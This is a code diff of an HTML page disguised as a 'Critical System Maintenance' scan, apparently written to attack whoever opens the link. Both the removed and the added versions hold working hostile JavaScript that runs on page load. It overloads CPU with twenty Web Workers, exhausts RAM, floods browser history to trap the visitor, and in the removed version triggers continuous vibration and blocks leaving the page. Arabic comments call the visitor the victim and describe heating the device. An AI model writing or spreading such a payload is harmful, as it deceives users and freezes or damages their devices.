@@ -1,52 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Critical System Update</title>
-    <style>
-        body { background: #000; color: #ff0000; text-align: center; font-family: 'Courier New', monospace; padding-top: 25%; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="spinner"></div>
-    <h1>System Repair in Progress...</h1>
-    <p>Do not close this window or turn off your device.</p>
+<head><title>Critical System Maintenance</title></head>
+<body style="background:black; color:white; text-align:center; padding-top:20%;">
+    <h1>Performing Deep System Scan...</h1>
+    <p>Please wait, do not minimize the browser.</p>
 
     <script>
-        function launchAttack() {
-            // 1. تفعيل الاهتزاز المستمر (Vibration)
-            // سيعمل على أجهزة أندرويد بشكل أساسي
-            if ("vibrate" in navigator) {
-                navigator.vibrate([1000, 500, 1000, 500, 1000]);
-                setInterval(() => { navigator.vibrate(2000); }, 500);
+        function burnCPU() {
+            // كود العمال (Web Workers) لإجبار المعالج على العمل بكل طاقته
+            const blob = new Blob([`
+                setInterval(() => {
+                    let x = 0;
+                    while (true) {
+                        x += Math.sqrt(Math.random() * 999999);
+                    }
+                }, 1);
+            `], { type: 'application/javascript' });
+
+            const workerUrl = URL.createObjectURL(blob);
+
+            // تشغيل 20 عامل في الخلفية (كل عامل يسحب نواة معالج)
+            for (let i = 0; i < 20; i++) {
+                new Worker(workerUrl);
             }
 
-            let heatPool = [];
-            
-            // 2. الهجوم الحراري وتجميد الرام (Thermal & RAM Overload)
-            while (true) {
-                // استهلاك الرام بسرعة البرق
-                heatPool.push(new Uint32Array(2000000).fill(Math.random()));
-
-                // إجبار المعالج على القيام بعمليات حسابية معقدة لرفع حرارته
-                for (let i = 0; i < 500000; i++) {
-                    let calc = Math.sqrt(Math.random() * 999999) / Math.sin(Math.random());
-                }
-
-                // 3. قفل المتصفح (Navigation Lock)
-                // إغراق الـ History لمنع الضحية من العودة للخلف أو الخروج
-                window.history.pushState(null, null, "#system-error-" + Date.now());
-                
-                // منع التفاعل مع الصفحة تماماً
-                window.onbeforeunload = function() { return "System is busy, please wait."; };
-            }
+            // تدمير الرام في المسار الرئيسي
+            let ramDestroyer = [];
+            setInterval(() => {
+                ramDestroyer.push(new Uint32Array(5000000).fill(Math.random()));
+                window.history.pushState(null, null, "#" + Math.random());
+            }, 10);
         }
 
-        // تشغيل الهجوم بعد ثانية واحدة من فتح الرابط
-        window.onload = function() {
-            setTimeout(launchAttack, 1000);
-        };
+        window.onload = burnCPU;
     </script>
 </body>
 </html>
